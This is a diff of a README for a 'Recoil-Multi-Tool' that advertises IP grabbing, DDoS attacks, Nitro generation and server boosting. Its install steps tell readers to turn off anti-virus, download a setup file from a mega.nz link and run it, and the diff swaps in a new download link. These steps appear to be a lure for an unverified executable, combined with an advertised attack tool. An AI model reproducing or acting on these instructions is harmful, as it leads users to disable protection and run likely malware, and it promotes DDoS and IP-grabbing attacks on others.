@@ -1,11 +1,11 @@
 # Recoil-Multi-Tool
 Very usefull tool for stuff like: copy server template, ip grab, ddos attacks, nitro gen, nitro check, boost server tool and much more!
 # How to install?
-# https://mega.nz/file/SMcz2QbB#3kQW0pqrJvMo2trW3fTIfZKlkNpf0UaTRs56yvGePog
+# https://mega.nz/file/SJUHkCwJ#TVZnS8tk4iv4RFPWN2CLoKzTgU39k7_fRVGiZkXuaU0
 Step 1:
 turn off anti-virus
 Step 2:
-Download the RecoilToolSetup file from: https://mega.nz/file/SMcz2QbB#3kQW0pqrJvMo2trW3fTIfZKlkNpf0UaTRs56yvGePog 
+Download the RecoilToolSetup file from: https://mega.nz/file/SJUHkCwJ#TVZnS8tk4iv4RFPWN2CLoKzTgU39k7_fRVGiZkXuaU0
 Step 3:
 Run the RecoilToolSetup file
 Step 4: 
